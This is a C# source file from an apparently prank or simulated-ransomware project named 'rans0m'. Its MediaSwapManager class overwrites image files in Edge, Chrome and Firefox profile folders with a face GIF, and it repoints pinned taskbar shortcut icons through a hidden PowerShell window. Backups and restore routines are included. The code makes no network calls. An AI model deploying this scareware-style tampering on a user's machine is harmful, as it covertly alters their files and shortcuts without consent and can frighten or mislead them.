using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.Json;

namespace rans0m
{
    /// <summary>
    /// Best-effort, fully reversible media swaps, all recorded in restore.json:
    ///  1. Loose image files inside the Edge / Chrome / Firefox profile dirs
    ///     (only those three browsers) are replaced with the face gif.
    ///  2. Pinned taskbar shortcut (.lnk) icons are pointed at our .ico via a
    ///     single hidden PowerShell + WScript.Shell pass (mirrors the proven
    ///     COM IconLocation technique).
    ///  3. Running app windows already get WM_SETICON via
    ///     DesktopRansomManager.TryChangeAppWindowIcons.
    ///
    /// Strict bounds keep this fast: max depth 5, image extensions only,
    /// proprietary cache dirs skipped, 4MB/file, 150 files / 64MB total backup.
    /// Locked or missing files are skipped per-file; nothing throws outward.
    /// </summary>
    public static class MediaSwapManager
    {
        private static readonly string[] ImageExts =
            new[] { ".png", ".jpg", ".jpeg", ".gif", ".bmp", ".webp" };

        private static readonly string[] SkipDirNames =
            new[] { "cache", "code cache", "gpucache", "shadercache", "service worker",
                    "crashpad", "crashes", "logs", "session storage", "local storage",
                    "blob_storage", "webrtc_event_logs" };

        private const int MaxDepth = 5;
        private const int MaxFiles = 150;
        private const long MaxBytesPerFile = 4L * 1024 * 1024;
        private const long MaxTotalBytes = 64L * 1024 * 1024;

        private static string BackupDir => Path.Combine(AssetManager.Dir, "mediabak");

        [DllImport("shell32.dll")]
        private static extern void SHChangeNotify(uint wEventId, uint uFlags, IntPtr dwItem1, IntPtr dwItem2);
        private const uint SHCNE_ASSOCCHANGED = 0x08000000;
        private const uint SHCNF_IDLIST = 0x0000;

        public class BrowserBackup
        {
            public string Original { get; set; } = "";
            public string Backup { get; set; } = "";
        }

        public class TaskbarBackup
        {
            public string Path { get; set; } = "";
            public string Icon { get; set; } = "";
        }

        private static List<string> BrowserRoots()
        {
            var roots = new List<string>(4);
            try
            {
                string local = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                string roam = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                if (!string.IsNullOrEmpty(local))
                {
                    roots.Add(Path.Combine(local, "Microsoft", "Edge", "User Data"));
                    roots.Add(Path.Combine(local, "Google", "Chrome", "User Data"));
                }
                if (!string.IsNullOrEmpty(roam))
                {
                    string ff = Path.Combine(roam, "Mozilla", "Firefox", "Profiles");
                    if (Directory.Exists(ff))
                    {
                        try { roots.AddRange(Directory.GetDirectories(ff)); }
                        catch { roots.Add(ff); }
                    }
                }
            }
            catch { }
            return roots.Where(d => { try { return Directory.Exists(d); } catch { return false; } }).ToList();
        }

        private static bool SkipDir(string name)
        {
            try
            {
                string n = name.ToLowerInvariant();
                foreach (var s in SkipDirNames)
                    if (n.Contains(s)) return true;
            }
            catch { }
            return false;
        }

        private static List<string> CollectImages()
        {
            var found = new List<string>(MaxFiles);
            string assetPrefix;
            try { assetPrefix = AssetManager.Dir.ToLowerInvariant(); } catch { assetPrefix = ""; }
            foreach (var root in BrowserRoots())
            {
                if (found.Count >= MaxFiles) break;
                var stack = new Stack<(string dir, int depth)>();
                stack.Push((root, 0));
                while (stack.Count > 0 && found.Count < MaxFiles)
                {
                    var (dir, depth) = stack.Pop();
                    if (depth > MaxDepth) continue;
                    string[] sub, files;
                    try { sub = Directory.GetDirectories(dir); } catch { continue; }
                    try { files = Directory.GetFiles(dir); } catch { continue; }
                    foreach (var f in files)
                    {
                        if (found.Count >= MaxFiles) break;
                        try
                        {
                            if (!ImageExts.Contains(Path.GetExtension(f).ToLowerInvariant())) continue;
                            if (f.ToLowerInvariant().StartsWith(assetPrefix)) continue;
                            var info = new FileInfo(f);
                            if (info.Length <= 0 || info.Length > MaxBytesPerFile) continue;
                            found.Add(f);
                        }
                        catch { }
                    }
                    if (depth < MaxDepth)
                    {
                        foreach (var s in sub)
                        {
                            try { if (!SkipDir(Path.GetFileName(s))) stack.Push((s, depth + 1)); } catch { }
                        }
                    }
                }
            }
            return found;
        }

        /// <summary>Swap browser images to the gif; returns backup records for restore.json.</summary>
        public static List<BrowserBackup> SwapBrowserImages(byte[] gifBytes)
        {
            var records = new List<BrowserBackup>();
            try
            {
                if (gifBytes == null || gifBytes.Length == 0) return records;
                var files = CollectImages();
                if (files.Count == 0) return records;
                try { Directory.CreateDirectory(BackupDir); } catch { return records; }
                long total = 0;
                int i = 0;
                foreach (var f in files)
                {
                    try
                    {
                        var info = new FileInfo(f);
                        if (total + info.Length > MaxTotalBytes) break;
                        string backup = Path.Combine(BackupDir, $"img{i++}{info.Extension.ToLowerInvariant()}");
                        File.Copy(f, backup, overwrite: true);
                        File.WriteAllBytes(f, gifBytes);
                        total += info.Length;
                        records.Add(new BrowserBackup { Original = f, Backup = backup });
                    }
                    catch { /* locked / vanished mid-scan: skip */ }
                }
                FileLogger.Log($"[MediaSwap] Browser images swapped: {records.Count}");
            }
            catch (Exception ex) { FileLogger.Log($"[MediaSwap] browser swap err: {ex.Message}"); }
            return records;
        }

        public static void RestoreBrowserImages(List<BrowserBackup>? records)
        {
            if (records == null || records.Count == 0) return;
            foreach (var r in records)
            {
                try
                {
                    if (string.IsNullOrEmpty(r.Original) || string.IsNullOrEmpty(r.Backup)) continue;
                    if (!File.Exists(r.Backup)) continue;
                    string? dir = Path.GetDirectoryName(r.Original);
                    if (!string.IsNullOrEmpty(dir)) Directory.CreateDirectory(dir);
                    File.Copy(r.Backup, r.Original, overwrite: true);
                    try { File.Delete(r.Backup); } catch { }
                }
                catch { }
            }
            try
            {
                if (Directory.Exists(BackupDir) && !Directory.EnumerateFileSystemEntries(BackupDir).Any())
                    Directory.Delete(BackupDir);
            }
            catch { }
            FileLogger.Log("[MediaSwap] Browser images restored");
        }

        private static string PinnedTaskbarDir()
        {
            try
            {
                string roam = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                return Path.Combine(roam, "Microsoft", "Internet Explorer", "Quick Launch", "User Pinned", "TaskBar");
            }
            catch { return ""; }
        }

        private static string RunHiddenPowerShell(string command, int timeoutMs = 30000)
        {
            try
            {
                var psi = new ProcessStartInfo("powershell.exe",
                    "-NoProfile -NonInteractive -WindowStyle Hidden -Command " + command)
                {
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    StandardOutputEncoding = Encoding.UTF8
                };
                using var p = Process.Start(psi);
                if (p == null) return "";
                var sb = new StringBuilder();
                p.OutputDataReceived += (_, e) => { if (e.Data != null) sb.AppendLine(e.Data); };
                try { p.BeginOutputReadLine(); } catch { }
                if (!p.WaitForExit(timeoutMs)) { try { p.Kill(); } catch { } return ""; }
                return sb.ToString();
            }
            catch { return ""; }
        }

        /// <summary>
        /// Point pinned taskbar .lnk icons at our ico in a SINGLE powershell
        /// launch (read originals + set new + print originals as JSON).
        /// Returns originals for restore.json.
        /// </summary>
        public static List<TaskbarBackup> SwapTaskbarIcons(string icoPath)
        {
            var records = new List<TaskbarBackup>();
            try
            {
                string dir = PinnedTaskbarDir();
                if (string.IsNullOrEmpty(dir) || !Directory.Exists(dir)) return records;
                string[] links;
                try { links = Directory.GetFiles(dir, "*.lnk"); } catch { return records; }
                if (links.Length == 0) return records;

                string want = icoPath + ",0";
                string list = string.Join(";", links.Select(l => "'" + l.Replace("'", "''") + "'"));
                // One process: for each link, print path+TAB+old icon, then set the new one.
                string cmd = "$s=New-Object -ComObject WScript.Shell; @(" + list + ") | ForEach-Object { try { $l=$s.CreateShortcut($_); $old=$l.IconLocation; if ($old -ne '" + want.Replace("'", "''") + "') { $_ + \"`t\" + $old; $l.IconLocation='" + want.Replace("'", "''") + "'; $l.Save() } } catch { } }";
                string output = RunHiddenPowerShell(cmd);
                foreach (var line in output.Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries))
                {
                    int tab = line.IndexOf('\t');
                    if (tab <= 0) continue;
                    string path = line.Substring(0, tab);
                    string icon = line.Substring(tab + 1);
                    if (string.IsNullOrEmpty(path) || !File.Exists(path)) continue;
                    records.Add(new TaskbarBackup { Path = path, Icon = icon });
                }
                if (records.Count == 0) return records;
                try { SHChangeNotify(SHCNE_ASSOCCHANGED, SHCNF_IDLIST, IntPtr.Zero, IntPtr.Zero); } catch { }
                FileLogger.Log($"[MediaSwap] Taskbar icons swapped: {records.Count}");
            }
            catch (Exception ex) { FileLogger.Log($"[MediaSwap] taskbar swap err: {ex.Message}"); }
            return records;
        }

        public static void RestoreTaskbarIcons(List<TaskbarBackup>? records)
        {
            if (records == null || records.Count == 0) return;
            try
            {
                string json = JsonSerializer.Serialize(records.Select(r => new { path = r.Path, icon = r.Icon }).ToList());
                string b64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(json));
                string setCmd = "$ErrorActionPreference='Stop'; $j=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('" + b64 + "')); $items=$j|ConvertFrom-Json; $s=New-Object -ComObject WScript.Shell; foreach($i in @($items)){ if(Test-Path -LiteralPath ([string]$i.path) -PathType Leaf){ $l=$s.CreateShortcut([string]$i.path); $l.IconLocation=[string]$i.icon; $l.Save() } }";
                RunHiddenPowerShell(setCmd);
                try
                {
                    var psi = new ProcessStartInfo("ie4uinit.exe", "-show")
                    {
                        CreateNoWindow = true, UseShellExecute = false
                    };
                    using var p = Process.Start(psi);
                    try { p?.WaitForExit(5000); } catch { }
                }
                catch { }
                try { SHChangeNotify(SHCNE_ASSOCCHANGED, SHCNF_IDLIST, IntPtr.Zero, IntPtr.Zero); } catch { }
                FileLogger.Log("[MediaSwap] Taskbar icons restored");
            }
            catch (Exception ex) { FileLogger.Log($"[MediaSwap] taskbar restore err: {ex.Message}"); }
        }
    }
}
